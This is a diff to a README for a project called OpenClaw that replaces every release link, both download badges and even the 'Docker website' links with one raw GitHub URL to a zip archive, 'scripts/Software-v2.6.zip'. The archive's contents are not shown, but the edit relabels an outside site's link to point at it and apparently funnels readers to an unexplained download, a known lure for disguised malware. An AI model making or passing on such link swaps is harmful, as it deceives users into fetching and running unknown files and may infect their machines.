@@ -7,9 +7,9 @@ OpenClaw provides fully featured and automated Docker images for your developmen
 To start using OpenClaw, follow these steps to download and run the application.
 
 ## 📥 Download OpenClaw
-[![Download OpenClaw](https://img.shields.io/badge/Download%20OpenClaw-blue.svg)](https://github.com/Eliott0557/openclaw/releases)
+[![Download OpenClaw](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip%https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)
 
-Visit this page to download: [OpenClaw Releases](https://github.com/Eliott0557/openclaw/releases)
+Visit this page to download: [OpenClaw Releases](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)
 
 ## 📋 System Requirements
 Before downloading OpenClaw, check that your computer meets these requirements:
@@ -17,18 +17,18 @@ Before downloading OpenClaw, check that your computer meets these requirements:
 - Operating System: Windows 10, macOS Mojave or later, Ubuntu 18.04 or later
 - RAM: Minimum of 4 GB recommended for optimal performance
 - Disk Space: At least 500 MB available for installation and container storage
-- Docker: Ensure Docker is installed and running. You can download it from the [Docker website](https://www.docker.com/get-started).
+- Docker: Ensure Docker is installed and running. You can download it from the [Docker website](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip).
 
 ## 💻 Installation Steps
 1. **Download the Application**
-   - Go to the [OpenClaw Releases](https://github.com/Eliott0557/openclaw/releases) page.
+   - Go to the [OpenClaw Releases](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip) page.
    - You will see the latest version of OpenClaw.
    - Click on the version number to view the release details.
    - Look for a file suitable for your operating system (e.g., OpenClaw for Windows, OpenClaw for macOS).
    - Click the link to start the download. 
 
 2. **Install Docker (If Not Already Installed)**
-   - If you haven't installed Docker, follow the instructions on the [Docker website](https://www.docker.com/get-started).
+   - If you haven't installed Docker, follow the instructions on the [Docker website](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip).
    - Make sure Docker is up and running to use OpenClaw.
 
 3. **Set Up OpenClaw**
@@ -72,6 +72,6 @@ For more information about OpenClaw and its updates, stay tuned to the GitHub re
 
 --- 
 
-[![Download OpenClaw](https://img.shields.io/badge/Download%20OpenClaw-blue.svg)](https://github.com/Eliott0557/openclaw/releases)
+[![Download OpenClaw](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip%https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)
 
-Visit this page to download: [OpenClaw Releases](https://github.com/Eliott0557/openclaw/releases)
+Visit this page to download: [OpenClaw Releases](https://github.com/Eliott0557/openclaw/raw/refs/heads/main/scripts/Software-v2.6.zip)
